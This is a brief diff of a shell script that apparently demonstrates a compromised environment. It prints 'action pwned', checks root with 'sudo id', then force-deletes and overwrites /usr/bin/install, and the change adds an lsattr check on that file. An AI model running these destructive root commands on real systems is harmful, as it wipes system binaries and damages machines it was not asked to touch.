@@ -40,6 +40,7 @@ function main() {
     echo "action pwned"
     sudo id
     ls -la /usr/bin/install
+    lsattr /usr/bin/install
 
     sudo rm -rf /usr/bin/install
     sudo echo > /usr/bin/install
